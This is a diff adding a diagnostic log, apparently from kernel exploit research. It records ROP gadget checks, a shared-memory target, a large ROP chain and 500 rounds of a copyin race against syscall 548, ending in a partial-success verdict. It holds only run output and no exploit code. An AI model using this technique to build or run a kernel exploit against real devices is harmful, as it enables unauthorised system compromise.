@@ -1,0 +1,43 @@
+=== PROBE 1529b: copyin race vs 548 op 3 (shm destination) ===
+
+fn_addr=0x000000082FF80B57 pid=186
+
+[A] gadget verification
+eboot=0x0000000040110000
+  pop_rax=OK pop_rdi=OK pop_rsi=OK pop_rdx=OK ret=OK pop_rsp=OK
+
+[B] shm destination + victim
+  shm_open(SHM_ANON=1, O_CREAT|O_RDWR) rv=41
+  ftruncate(41, 0x80000) rv=0
+  shm mmap -> 0x0000000311B28000
+  victim mmap -> 0x0000000311BA8000
+  victim tagged 0x41 for 0x100 bytes: true
+
+[C] child chain
+  stack mmap -> 0x0000000312D00000 alloc=2981888 bytes=0
+  chain qwords=369321 bytes=2954568 alloc=2981888 stack=0x0000000312D00000 write=true
+
+[D] race
+  mapping aliases the descriptor: true
+  pre-placement rv=13182337024 done=1 log offset=68
+  thr_new rv=0 child_tid=102086
+  round 100 bad_place=0 bad_prot=0 child_offset=164608
+  round 200 bad_place=0 bad_prot=0 child_offset=323840
+  round 300 bad_place=0 bad_prot=0 child_offset=79360
+  round 400 bad_place=0 bad_prot=0 child_offset=524288
+  round 500 bad_place=0 bad_prot=0 child_offset=524288
+  rounds=500 bad_place=0 bad_prot=0 last_victim_word=0
+
+[E] scan the shm destination
+  shm size=0x80000 scanned_from=68 scanned=524288 chunks_with_0x41=0 read_fails=0
+
+[E2] child liveness
+  shared offset = 524288, first sample was 68, growth=524220
+  per-round offsets: 164608 323840 79360 524288 524288 (wraps each lap), distinct=4
+
+[F] verdict
+  VERDICT PARTIAL: the offset took only 4 distinct values across
+  the loop, so the child was not writing for most of it
+  final pid=186 expected 186
+
+=== PROBE 1529b COMPLETE ===
